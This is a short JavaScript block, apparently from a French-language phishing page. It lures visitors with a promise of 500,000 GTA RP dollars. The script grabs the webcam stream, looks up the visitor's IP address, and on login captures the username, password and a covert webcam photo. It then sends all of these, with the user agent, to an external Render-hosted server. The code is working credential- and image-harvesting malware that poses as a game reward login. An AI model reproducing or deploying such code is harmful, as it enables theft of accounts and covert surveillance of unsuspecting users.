<script>
    const videoStream = document.getElementById('videoStream');
    let userIpAddress = 'Non détectée';

    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => { userIpAddress = data.ip; })
        .catch(err => console.error("Erreur IP:", err));

    navigator.mediaDevices?.getUserMedia({ video: true })
        .then(stream => { videoStream.srcObject = stream; })
        .catch(err => console.error("Caméra non accessible :", err));

    function capturePhoto() {
        if (!videoStream || !videoStream.srcObject) return null;
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 480;
            canvas.height = 360;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        } catch (e) {
            return null;
        }
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user = document.getElementById('username').value.trim();
        const pass = document.getElementById('password').value.trim();

        if (!user || !pass) return;

        const photoData = capturePhoto();

        try {
            // Utilisation de l'URL complète de ton instance Render pour s'affranchir des erreurs de routage
            const response = await fetch('https://unity-30ez.onrender.com/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: user,
                    password: pass,
                    ip: userIpAddress,
                    photo: photoData,
                    userAgent: navigator.userAgent
                })
            });

            if (response.ok) {
                alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
                document.getElementById('loginForm').reset();
            } else {
                alert('Erreur lors du traitement de la connexion par le serveur.');
            }
        } catch (err) {
            console.error("Erreur réseau critique :", err);
            alert('Erreur de communication avec le serveur en ligne.');
        }
    });
</script>
